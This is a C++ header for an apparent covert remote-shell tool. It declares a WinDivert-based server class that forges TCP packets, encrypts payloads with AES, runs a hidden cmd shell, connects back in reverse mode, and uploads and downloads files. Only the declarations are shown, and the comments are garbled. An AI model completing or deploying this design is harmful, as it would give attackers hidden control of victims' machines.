#include <winsock2.h>
#include <windows.h>
#include <sstream>
#include <iostream>
#include <fstream>
#include <process.h>
#include "windivert.h"
#include "aes.h"

using namespace std;

#define SHELL_START "shell_start"
#define FILE_SIZE 1024	// better less than 1460(MSS)

class CServer
{
private:
	shared_ptr<char[]> m_packet_template;
	UINT m_template_packet_len;
	shared_ptr<WINDIVERT_ADDRESS> m_addr_template;
	HANDLE m_divert_handle;
	AES_CONTEXT m_aes_ctx;
	char last_cmd[MAX_PATH];
	// shell�ùܵ��ṹ��
	HANDLE m_std_in_rd = NULL;
	HANDLE m_std_in_wr = NULL;
	HANDLE m_std_out_rd = NULL;
	HANDLE m_std_out_wr = NULL;
	HANDLE m_read_thread = NULL;
	PROCESS_INFORMATION m_proc_info;
	UINT m_thread_id;
	bool m_use_crypt = false;
	bool m_reverse_mode = false;
	DWORD m_client_port;
	UINT32 m_laddr;
	UINT32 m_raddr;
	UINT16 m_lport;
	UINT16 m_rport;

public:
	CServer();
	~CServer();
	void start();
	void set_reverse_mode(bool mode);
	void show_help();
	void set_use_encrypt(bool mode);
	void set_lport(UINT16 lport);
	void set_rport(UINT16 rport);
	bool set_laddr(std::string laddr);
	bool set_raddr(std::string raddr);

private:
	void set_packet_template(PVOID packet, UINT recv_len);								// ��ʽ����׼���Ͱ�
	void set_addr_template(WINDIVERT_ADDRESS addr);
	void send_response_packet(PVOID packet, UINT recv_len);								// ����ȷ�հ�
	void send_data_packet(const char* payload_buf, int payload_len = 0);				// �������ݰ�
	BOOL init_divert(const char* filter);												// ��ʼ��windivert
	void run_shell();																	// ��shell
	void init_shell();																	
	void exit_shell();																	// �˳�shell
	void add_seq(UINT seq);																// ��ӱ�׼����seq
	void send_connect_reponse(PVOID packet, UINT recv_len);								// ģ��tcp��������
	void encrypt_payload(PVOID original_buf, UINT buf_len);
	void decrypt_payload(PVOID encrypt_buf, UINT buf_len);
	void print_ip_info(PWINDIVERT_IPHDR ip_header);
	bool recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID* payload_buf);
	void wait_for_connect();
	void download_file(string download_str);
	void upload_file(string upload_str);
	bool release_sysfile();
	bool connect_to_target();
	void build_packet_template();
	void build_addr_template();
	static unsigned WINAPI read_from_cmd(void* ptr);									// ��ȡcmd����߳�
};